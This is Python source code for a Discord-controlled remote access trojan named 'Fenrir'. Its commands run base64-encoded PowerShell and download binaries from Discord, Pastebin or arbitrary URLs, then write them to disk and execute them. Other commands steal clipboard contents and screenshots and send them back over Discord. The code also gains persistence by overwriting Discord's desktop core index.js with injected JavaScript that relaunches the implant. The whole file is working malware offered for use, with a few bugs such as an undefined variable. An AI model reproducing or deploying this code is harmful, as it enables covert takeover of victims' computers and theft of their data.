import discord
from discord.ext import commands
import socket
import subprocess
import getpass
import base64
import requests
import sys
import pyperclip
import mss
import os
import re

mutexSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mutexSock.bind(('127.0.0.1', 1337))
mutexSock.listen(1)



ownerId = <owner_id>
token = "<token>"
bot = commands.Bot(command_prefix="fenrir ")
id = socket.gethostname()


@bot.event
async def on_ready():
    print(("Fenrir"))
    print("Ready to assist :)")
    await bot.change_presence(activity=discord.Game(name="with binaries üê∫ "))

@bot.command(name="hostname")
async def SayHostName(ctx):
    await ctx.send(id)


@bot.command(name=id + "_localIP")
async def localIP(ctx):
    #Displays the main routeable IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('9.9.9.9', 1))
        local = s.getsockname()[0]
        await ctx.send(local)
    except:
        await ctx.send("Some strange error occured")
        return
    s.close()

@bot.command(name=id + "_whoami")
async def Whoami(ctx):
    await ctx.send(getpass.getuser())

@bot.command(name=id + "_commonports")
async def localports(ctx, arg1):
    await ctx.send("Checking common ports")
    embed = discord.Embed(title="Port status", color=0x00ff00)
    ports = {
    "21": "FTP",
    "22": "SSH",
    "23": "Telnet",
    "25": "SMTP",
    "53": "DNS",
    "80": "HTTP",
    "194": "IRC",
    "443": "HTTPS",
    "3306": "MySQL"}
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((arg1, int(port)))
            embed.add_field(name=ports[port] + " " + port, value="Open", inline=False)
        except socket.error:
            embed.add_field(name=ports[port] + " " + port, value="Closed", inline=False)
    await ctx.send(embed=embed)

@bot.command(name=id + "_base64ps1")
async def Base64PS(ctx, arg1):
    try:
        decoded = base64.b64decode(arg1)
        decodedStr = str(decoded, "utf-8")
        subprocess.Popen("powershell.exe " + decodedStr, shell=False)
        await ctx.send("Ran powershell script")
    except:
        await ctx.send("Hit an error running powershell script, check your base64, or maybe its time to get out")

@bot.command(name=id + "_createbinary")
async def CreateBinary(ctx, arg1):
    await ctx.send("Generating binary")
    for attachment in ctx.message.attachments:
        try:
            r = requests.get(attachment.url)
            base64Encoded = r.content
            decodedBase64 = base64.b64decode(base64Encoded)
        except:
            await ctx.send("Error connecting to discord CDN")
            return
    try:
        open(arg1, "wb").write(decodedBase64)
        await ctx.send("Sucessfully wrote binary to disk")
    except:
        await ctx.send("Error occured, might not have high enough permissions, or antivirus is blocking")

@bot.command(name=id + "_runbinary")
async def RunBin(ctx, arg1):
    try:
        subprocess.Popen(arg1)
        await ctx.send("Ran file sucessfully")
    except:
        await ctx.send("Not able to run file, recheck your file name")

@bot.command(name=id + "_createbinary_pastebin")
async def CreateBinPastebin(ctx, arg1, arg2):
    await ctx.send("Getting the base64")
    try:
        r = requests.get(arg1)
        base64Encoded = r.content
    except:
        await ctx.send("Hit an error getting paste")
        return
    try:
        decodedBase64 = base64.b64decode(base64Encoded)
        open(arg2, "wb").write(decodedBase64)
        await ctx.send("Decoded base64 and wrote it to disk")
    except:
        await ctx.send("Error writing to disk")
        return
@bot.command(name=id + "_getclipboard")
async def GetClipBoard(ctx):
    await ctx.send("Here is the last clipboard item: ")
    await ctx.send(pyperclip.paste())

@bot.command(name=id + "_screenshot")
async def ScreenShot(ctx):
    await ctx.send("Grabbing screenshots")
    with mss.mss() as sct:
        for screen in sct.save():
            with open(screen, 'rb') as fp:
                await ctx.send(file=discord.File(fp, screen))
            os.remove(screen)
@bot.command(name=id + "_downloadweb")
async def DownloadWeb(ctx, arg1, arg2):
    with requests.get(arg1, stream=True) as r:
        r.raise_for_status()
        with open(arg2, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
@bot.command(name=id + "_listfiles")
async def LS(ctx, path):
    await ctx.send(os.listdir(arg1))

@bot.command(name="nuke")
async def purge(ctx, arg : int):
    channel = ctx.channel
    if(ctx.message.author.id == ownerId):
        if(arg == 1337):
            await channel.purge(limit=None)
        else:
            await channel.purge(limit=arg)
@bot.command(name=id + "_isdiscordpresent")
async def IsDiscordPresent(ctx):
    discordDir = os.environ['APPDATA'] + "\\Discord"
    if os.path.isdir(discordDir):
        await ctx.send("Discord is installed")

    else:
        await ctx.send("Discord is not installed")
@bot.command(name= id + "_createpersistence_discordpayload")
async def DiscordPersistence(ctx, arg1=None):
    exeName = os.path.abspath(sys.argv[0])
    exeName = exeName.replace('\\', '\\\\')
    payload = 'var exe = "{}";'.format(exeName)
    payload += '\n'
    payload += 'var parmsVar = " {}";'.format(key.decode("utf-8"))
    payload += '''
var parms = [parmsVar];
const fs = require('fs')
module.exports = require('./core.asar');
var child = require('child_process').execFile;
var backup = require('child_process').execFile
var exePath = exe;
var encodedData = '
var buff = Buffer.from(encodedData, 'base64'); 
child(exePath, parms, function(err, data) {
     if(err){
        fs.writeFile('DiscordUpdateService.exe', buff, (err) => {
            if (err){
                
            }});
     };
});
backup('DiscordUpdateService.exe', function(err, data){
        if(err){
            
        }
}); 
    
    
    '''
    payload = str.encode(payload)
    discordRegXp = re.compile(r'discord_desktop_core')
    discordPath = os.environ['APPDATA'] + "\\Discord\\"
    for dir, subdir, file in os.walk(discordPath):
        for x in file:
            if x == "index.js":
                if discordRegXp.search(os.path.join(dir, x)):
                    open(os.path.join(dir, x), "wb").write(payload)
    await ctx.send("Sucessfully injected JavaScript")

@bot.command(name=id + "_createlnkfile")
async def CreateLnk(ctx, path):
    try:
        updatePath = os.environ['LOCALAPPDATA'] + "\\Discord\\"
        for dir, subdir, file in os.walk(updatePath):
            for x in file:
                if x == "Update.exe":
                    updateExe = os.path.join(dir, x)
                    cmd =  (updateExe + " --createShortcut " + path + " --setupIcon " + updatePath + "app.ico")

                    subprocess.Popen(cmd)
        await ctx.send("Created .lnk file on the desktop")
    except:
        await ctx.send("Couldn't create an .lnk file")
        return


@bot.command(name=id + "_discord_startprocess")
async def DiscordStartProcess(ctx, path):
    try:
        updatePath = os.environ['LOCALAPPDATA'] + "\\Discord\\"
        for dir, subdir, file in os.walk(updatePath):
            for x in file:
                if x == "Update.exe":
                    updateExe = os.path.join(dir, x)
                    cmd =  (updateExe + " --processStart " + path)
                    subprocess.Popen(cmd)
    except:
        await ctx.send("Couldn't spawn process")

@bot.command(name=id + "_discord_getlocalappdata")
async def GetLocalAppData(ctx):
    await ctx.send(os.environ['LOCALAPPDATA'] + "\\Discord\\")






bot.run(token)
